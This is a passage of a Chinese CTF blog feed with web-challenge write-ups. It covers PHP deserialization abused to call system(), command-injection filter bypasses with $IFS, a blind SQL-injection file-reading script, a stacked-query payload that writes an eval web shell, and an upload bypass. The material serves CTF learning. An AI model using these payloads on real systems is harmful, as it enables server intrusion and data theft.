unserialize(base64_decode($config));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'p'</span>]))&#123;</span><br><span class="line">    $p=$_GET[<span class="string">'p'</span>];</span><br><span class="line">    $config-&gt;$p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $config;</span><br><span class="line">    <span class="keyword">private</span> $path;</span><br><span class="line">    <span class="keyword">public</span> $filter;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($config=<span class="string">""</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = $config;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getConfig</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;config == <span class="string">""</span>)&#123;</span><br><span class="line">            $config = <span class="keyword">isset</span>($_POST[<span class="string">'config'</span>])?$_POST[<span class="string">'config'</span>]:<span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">SetFilter</span><span class="params">($value)</span></span>&#123;</span><br><span class="line"><span class="comment">//        echo $value;</span></span><br><span class="line">$value=waf_exec($value); </span><br><span class="line">        var_dump($value);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;filter)&#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;filter <span class="keyword">as</span> $filter)&#123;</span><br><span class="line"></span><br><span class="line">                </span><br><span class="line">                $array = is_array($value)?array_map($filter,$value):call_user_func($filter,$value);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filter = <span class="keyword">array</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        <span class="comment">//var_dump($key);</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;SetFilter($key);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>还有一个waf.php,对上面的$value值进行了过滤，这里对命令执行的一些常用语句进行了过滤，所以我们需要进行绕过<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">        $black_str = <span class="string">"/(and|into|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&amp;])/i"</span>;</span><br><span class="line">        $str = preg_replace($black_str, <span class="string">"@@"</span>,$str);</span><br><span class="line">        <span class="keyword">return</span> addslashes($str);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf_exec</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $black_str = <span class="string">"/(;|&amp;|&gt;|&#125;|&#123;|%|#|!|\?|@|\+|\/| )/i"</span>;</span><br><span class="line">        $str = preg_replace($black_str, <span class="string">""</span>,$str);</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>这里的关键是分析<code>config.php</code>里面的代码，一看里面存在<code>unserialize</code>这样的东西，就应该考察的是反序列化，但是这里考的点不是魔法函数，因为构造函数里不存在可以利用的点，但是在<code>SetFilter</code>这个方法里面存在<code>call_user_func</code>这样的回调函数，这个函数第一个参数你想要执行的函数名，第二个参数是要传进去该函数的参数，这里就可以去执行命令<br>先构造类<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$over  = <span class="keyword">new</span> Config();</span><br><span class="line">$over-&gt;filter = <span class="keyword">array</span>(<span class="string">"system"</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($over));</span><br></pre></td></tr></table></figure></p><p>现在的关键点是对<code>$value</code>赋值，这个东东通过 <code>SetFilter</code>这个方法去传参，往上是通过<code>__get</code>去调用的<br>这个函数的功能是可以调用类里面的私有变量，也可以使用未定义的变量进行赋值，然后config参数是通过<code>cookie</code>传参的，把构造好的序列化放进<code>cookie</code>里面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG=Tzo2OiJDb25maWciOjM6e3M6MTQ6IgBDb25maWcAY29uZmlnIjtzOjA6IiI7czoxMjoiAENvbmZpZwBwYXRoIjtOO3M6NjoiZmlsdGVyIjthOjE6e2k6MDtzOjY6InN5c3RlbSI7fX0=</span><br></pre></td></tr></table></figure></p><p>尝试<code>ls</code>命令，出现flag字样的东东，但其实这是个文件夹，可以用ls -l 查看一下<br><a href="https://imgchr.com/i/FmlI4f" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmlI4f.md.png" alt="FmlI4f.md.png"></a></p><p>但是因为空格被过滤了，用$IFS绕过,同样地/也被过滤了同样需要绕过，这里用<code>expr substr $(pwd) 1 1</code>去绕过<br>注意这里面的空格也得变成<code>$IFS</code>，但是直接变成<code>expr$IFSsubstr$IFS$(pwd)$IFS1$IFS1</code>也不行，因为系统辨别出不出，会出现这样的结果<br><img src="https://s1.ax1x.com/2018/11/30/FmlbvQ.png" alt="FmlbvQ.png"><br>所以得用<code>\</code>分割一下<br><img src="https://s1.ax1x.com/2018/11/30/FmlLuj.png" alt="FmlLuj.png"><br>得到路径下存在flag.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(54) &quot;ls$IFS.`expr$IFS\substr$IFS$(pwd)$IFS\1$IFS\1`flag2333&quot; flag.php</span><br></pre></td></tr></table></figure></p><p>开始尝试读取文件了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10015/index.php?p=cat$IFS.`expr$IFS\substr$IFS$(pwd)$IFS\1$IFS\1`flag2333`expr$IFS\substr$IFS$(pwd)$IFS\1$IFS\1`flag.php</span><br></pre></td></tr></table></figure></p><p>获得flag<br><a href="https://imgchr.com/i/FmlXbn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmlXbn.md.png" alt="FmlXbn.md.png"></a><br><code>flag{d6e29836ea0e962b0b00c3bf9292b5ad}</code></p><h3 id="write-a-shell"><a href="#write-a-shell" class="headerlink" title="write a shell"></a>write a shell</h3><p>这一题也是要测试出来可以用loadfile读文件，先把文件读出来，写了个脚本读文件，读的是<code>user.php</code>的页面源码，前提是得有超过127的用户注册才可以很顺利地读取源码，如果不够可以自己写个脚本跑一下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">"http://101.71.29.5:10011/user/user.php?id=ascii(mid(load_file(0x2f7661722f7777772f68746d6c2f757365722f757365722e706870),&#123;_&#125;,1))"</span></span><br><span class="line">con = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">100000</span>):</span><br><span class="line">ans=requests.get(url.format(_=str(i)),cookies=&#123;<span class="string">'PHPSESSID'</span>:<span class="string">'bvbjr3qjrktp6qfn393f6itso0'</span>&#125;)</span><br><span class="line">s = re.findall(<span class="string">r"&lt;h1&gt;user_id:(.*?)&lt;/h1&gt;"</span>,ans.content)</span><br><span class="line">con = con+chr(int(s[<span class="number">0</span>]))</span><br><span class="line"><span class="keyword">print</span> con</span><br></pre></td></tr></table></figure></p><p>读出来一部分关键代码是这样子的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'../bwvs_config/sys_config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'user_name'</span>])) &#123;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'../header.php'</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($SESSION[<span class="string">'user_id'</span>])) &#123;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM dwvs_user_message WHERE user_name ="</span>.<span class="string">"'&#123;$_SESSION['user_name']&#125;'"</span>;</span><br><span class="line">$data = mysqli_query($connect,$sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'Mysql Error!!'</span>);</span><br><span class="line">$result = mysqli_fetch_array($data);</span><br><span class="line">$_SESSION[<span class="string">'user_id'</span>] = $result[<span class="string">'user_id'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$html_avatar = htmlspecialchars($_SESSION[<span class="string">'user_favicon'</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">$id=waf($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$sql = <span class="string">"SELECT * FROM dwvs_user_message WHERE user_id ="</span>.$id;</span><br><span class="line">$data = mysqli_multi_query($connect,$sql) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line"><span class="keyword">if</span>($result = mysqli_store_result($connect))&#123;</span><br><span class="line">$row = mysqli_fetch_row($result);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;h1&gt;user_id:'</span>.$row[<span class="number">0</span>].<span class="string">"&lt;/h1&gt;&lt;br&gt;&lt;h2&gt;user_name:"</span>.$row[<span class="number">1</span>].<span class="string">"&lt;/h2&gt;&lt;br&gt;&lt;h3&gt;</span></span><br></pre></td></tr></table></figure></p><p>同样的道理我们可以把bwvs_config/waf.php里面的内容读出来，可以看到过滤的内容<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">$black_str = <span class="string">"/(and|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&amp;]|\^)/i"</span>;</span><br><span class="line">$str = preg_replace(<span class="string">'/@/'</span>,<span class="string">'@-@'</span>,$str);</span><br><span class="line">$str = preg_replace($black_str, <span class="string">"@"</span>,$str);</span><br><span class="line"><span class="keyword">return</span> addslashes($str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>题目提示要写shell，就需要找可以写shell的文件路径，但得找到具有写权限的文件夹才可以执行，这里的关键点是利用这段代码mysqli_multi_query的多行执行语句去执行相关的写操作。<br>这里涉及到一个新的知识点，就是SQL的预编译语句，通过定义变量名的方式，用execute语句去执行相关操作<br>预制语句的SQL语法基于三个SQL语句：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PREPARE</span> stmt_name <span class="keyword">FROM</span> preparable_stmt;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">EXECUTE</span> stmt_name [<span class="keyword">USING</span> @var_name [, @var_name] ...];</span><br><span class="line">  </span><br><span class="line">&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name;</span><br></pre></td></tr></table></figure></p><p>在自己机子上试一下<br><a href="https://imgchr.com/i/Fm1Mxe" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/Fm1Mxe.md.png" alt="Fm1Mxe.md.png"></a><br>因此可以来构造一下语句<code>PREPARE over FROM &quot;select * from ….&quot;;</code>但是waf里面很明显就是过滤了select我们需要去绕过一下还有单双引号都被转义，这就需要<code>char()</code>以及<code>concat()</code>函数的协助了，也可以正常显示<br><a href="https://imgchr.com/i/Fm1GVI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/Fm1GVI.md.png" alt="Fm1GVI.md.png"></a><br>下面就到使用<code>into outfile</code>的时候了，但还是得先找到那一个目录可以写文件，这里面我们还有一个上传的功能点没用到，一般上传的话我们需要开启写的权限，你自己写一次上传的代码就会知道，如果没有写权限的话，就会使服务器报错，所以图片保存的地方就应该是可以目录，可以查看图像的目录放在哪<br><img src="https://s1.ax1x.com/2018/11/30/Fm1YIP.png" alt="Fm1YIP.png"><br>在这一个目录下，这样我们就基本确定shell该放在哪里，这里的话其实还有一个点就是网站目录要怎么显示，可以利用show variables like ‘secure_file_priv%’;去查看对应的信息，如果是空的话说明哪里都可以读或者写目录了，根据user.php里面的代码可以知道执行之后会显示1,2,5列，所以我们可以将这个语句转化一下就可以知道那个目录可以写了，这样比猜靠谱多了。。。。<br><a href="https://imgchr.com/i/Fm1aRS" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/Fm1aRS.md.png" alt="Fm1aRS.md.png"></a></p><p>现在就可以构造一下语句了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;select &apos;&lt;?php eval($_POST[cmd]);?&gt;&apos; into outfile &apos;/var/www/html/favicon/over.php&apos;&quot;</span><br></pre></td></tr></table></figure></p><p>把双引号里面的东西转一下<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> @b=<span class="keyword">concat</span>(<span class="built_in">CHAR</span>(<span class="number">115</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">60</span>, <span class="number">63</span>, <span class="number">112</span>, <span class="number">104</span>, <span class="number">112</span>, <span class="number">32</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">40</span>, <span class="number">36</span>, <span class="number">95</span>, <span class="number">80</span>, <span class="number">79</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">91</span>, <span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">93</span>, <span class="number">41</span>, <span class="number">59</span>, <span class="number">63</span>, <span class="number">62</span>, <span class="number">39</span>, <span class="number">32</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">111</span>, <span class="number">32</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">102</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">119</span>, <span class="number">119</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">109</span>, <span class="number">108</span>, <span class="number">47</span>, <span class="number">102</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">111</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">46</span>, <span class="number">112</span>, <span class="number">104</span>, <span class="number">112</span>, <span class="number">39</span>));</span><br><span class="line"><span class="keyword">PREPARE</span> s <span class="keyword">from</span> @b;</span><br><span class="line"><span class="keyword">EXECUTE</span> s;</span><br></pre></td></tr></table></figure></p><p>但是这样还是不行，因为@会被替换成@-@，所以得利用黑名单的替换功能把@变成黑名单里面的东西，经过黑名单替换后就会变成@啦<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> ^b=<span class="keyword">concat</span>(<span class="built_in">CHAR</span>(<span class="number">115</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">60</span>, <span class="number">63</span>, <span class="number">112</span>, <span class="number">104</span>, <span class="number">112</span>, <span class="number">32</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">40</span>, <span class="number">36</span>, <span class="number">95</span>, <span class="number">80</span>, <span class="number">79</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">91</span>, <span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">93</span>, <span class="number">41</span>, <span class="number">59</span>, <span class="number">63</span>, <span class="number">62</span>, <span class="number">39</span>, <span class="number">32</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">111</span>, <span class="number">32</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">102</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">119</span>, <span class="number">119</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">109</span>, <span class="number">108</span>, <span class="number">47</span>, <span class="number">102</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">111</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">46</span>, <span class="number">112</span>, <span class="number">104</span>, <span class="number">112</span>, <span class="number">39</span>));</span><br><span class="line"><span class="keyword">PREPARE</span> s <span class="keyword">from</span> ^b;</span><br><span class="line"><span class="keyword">EXECUTE</span> s;</span><br></pre></td></tr></table></figure></p><p>然后找到<code>favicon/over.php</code>直接菜刀连接就可以了<br><a href="https://imgchr.com/i/Fm3nwn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/Fm3nwn.md.png" alt="Fm3nwn.md.png"></a><br><code>flag{f6c5acfd4192b4152661d19b411d2d63}</code></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>这里就简单小结一下:<br>1.python flask的session机制问题，可以利用其构造管理员身份登录<br>2.构造软连接去读取文件内容<br>3.注入点如何构造逻辑，如何测试通过注册页面探测过滤字符以及过滤方式<br>4.利用伪协议读取文件，并且如何利用伪协议进行命令执行<br>5.PHP反序列化里面的__get()方法起到的作用，如何去使用它对可控变量赋值<br>6.利用SQL注入读写文件的前提，如何查看<br>7.命令执行以及SQL注入绕过的一些小trick</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;考完网络安全跟算法就赶紧来复现一下题目，又学到了一波知识了
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>安恒10月赛Web题目复现</title>
    <link href="0verwatch.top/anheng-10month.html"/>
    <id>0verwatch.top/anheng-10month.html</id>
    <published>2018-11-08T12:46:41.000Z</published>
    <updated>2018-11-08T14:04:40.774Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>10月赛的时候去打那个瓜皮的领航杯(体验极差)，还是回来复现安恒的题目比较好<a id="more"></a>，质量还是有保证的，学到很多东西</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="easy-audit"><a href="#easy-audit" class="headerlink" title="easy audit"></a>easy audit</h3><p>这个题目确实有点脑洞。。运用了两个php函数一个是<code>get_defined_functions</code>这个函数是用于返回所有已定义函数的数组，而另外一个则是<code>get_defined_vars</code> 这个函数是返回由所有已定义变量所组成的数组<br>可以查看此网址:<a href="https://www.jb51.net/article/42890.htm" target="_blank" rel="noopener">https://www.jb51.net/article/42890.htm</a></p><p>右键查看源代码发现存在<code>index.php?func1</code>，那么这个参数究竟有什么作用可以先尝试一下，上手就来一个phpinfo，发现直接有回显<br><a href="https://imgchr.com/i/iH0hd0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iH0hd0.md.png" alt="iH0hd0.md.png"></a><br>猜测是直接运行函数之类的功能,然后运用get_defined_functions 获得全局的函数这里面的函数有内置的也有开发人员自己定义的函数，可以发现最后的这一个函数特别显眼，调用一下这个函数发现有源码出来<br><a href="https://imgchr.com/i/iH0TWF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iH0TWF.md.png" alt="iH0TWF.md.png"></a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//include 'real_flag.php';</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jam_source_ctf_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">jam_flag</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])?$_GET[<span class="string">'a'</span>]:<span class="string">'123'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gen_str</span><span class="params">($m=<span class="number">6</span>)</span></span>&#123;</span><br><span class="line">        $str = <span class="string">''</span>;</span><br><span class="line">        $str_list = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span>;</span><br><span class="line">        <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$m;$i++)&#123;</span><br><span class="line">            $str .= $str_list[rand(<span class="number">0</span>,strlen($str_list)<span class="number">-1</span>)];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">GiveYouTheFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'real_flag.php'</span>;</span><br><span class="line">        $secret = <span class="keyword">$this</span>-&gt;gen_str();</span><br><span class="line">        <span class="comment">//echo $secret;</span></span><br><span class="line">        <span class="keyword">if</span>($secret === <span class="keyword">$this</span>-&gt;a)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $real_flag;<span class="comment">//echo $flag</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'want to use me?'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;GiveYouTheFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> rand().<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">$_flag = <span class="keyword">new</span> jam_flag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]) &amp;&amp; $_POST[<span class="string">'flag'</span>] === <span class="string">'I want the flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'real_flag.php'</span>;</span><br><span class="line">    $_flag-&gt;GiveYouTheFlag();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>这段代码大致的意思就是新建了一个类，然后调用类里面的函数把flag给输出来<br>这里我们用到<code>get_defined_vars</code>这个函数，单独使用是不能输出flag的，可能到这里会存在疑问输出flag的函数应该还得满足<code>$secret === $this-&gt;a</code>而这个secret又是随机生成的，那要怎么办，其实不需要，这里的flag是属于<code>real_flag.php</code>里面的只要我们把页面包含进来我们就可以把该页面所有变量值都给打印出来了，所以关键点还得满足这个条件<br><code>isset($_POST[&#39;flag&#39;]) &amp;&amp; $_POST[&#39;flag&#39;] === &#39;I want the flag&#39;</code><br>即可包含real_flag.php，这应该是出题人故意留的不然也输出不了flag，23333<br><a href="https://imgchr.com/i/iHBiyd" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHBiyd.md.png" alt="iHBiyd.md.png"></a><br>发包得到flag<br><a href="https://imgchr.com/i/iHBAeI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHBAeI.md.png" alt="iHBAeI.md.png"></a></p><h3 id="手速要快"><a href="#手速要快" class="headerlink" title="手速要快"></a>手速要快</h3><p>这个题目进去之后要登录，右键查看源代码找找http头部啥的发现里面有一个password，直接复制提交就可以登陆上去，登陆以后是一个upload页面<br><img src="https://s1.ax1x.com/2018/11/08/iHBMlQ.png" alt="iHBMlQ.png"><br><img src="https://s1.ax1x.com/2018/11/08/iHBlOs.png" alt="iHBlOs.png"></p><p>然后尝试上传一个小马，发现不行，然后尝试改一下后缀发现这应该是黑名单过滤的，因为尝试了<code>php2,php3.php4</code>都可以上传，但是却不能解析把他们都当做文本解析了<br><a href="https://imgchr.com/i/iHBapF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHBapF.md.png" alt="iHBapF.md.png"></a><br>但是可以发现服务器版本是<code>Apache/2.4.6</code>，这里可能存在解析漏洞，把后缀名改为Apache不认识的就可以了<br><a href="https://imgchr.com/i/iHBw6J" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHBw6J.md.png" alt="iHBw6J.md.png"></a><br><a href="https://imgchr.com/i/iHB7AP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHB7AP.md.png" alt="iHB7AP.md.png"></a><br>flag直接在上层目录flag{698539765730b69026796420b9201e03}</p><h2 id="CoolCms"><a href="#CoolCms" class="headerlink" 